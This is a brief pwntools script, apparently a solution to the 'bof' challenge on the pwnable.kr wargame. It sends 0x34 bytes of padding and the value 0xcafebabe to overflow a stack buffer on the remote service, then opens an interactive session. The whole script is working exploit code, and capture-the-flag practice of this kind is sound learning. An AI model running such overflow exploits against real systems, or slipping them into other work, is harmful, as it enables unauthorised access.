from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/bof')
else:
    r = remote('pwnable.kr', 9000)

r.sendline(b'A' * 0x34 + p32(0xcafebabe))

r.interactive()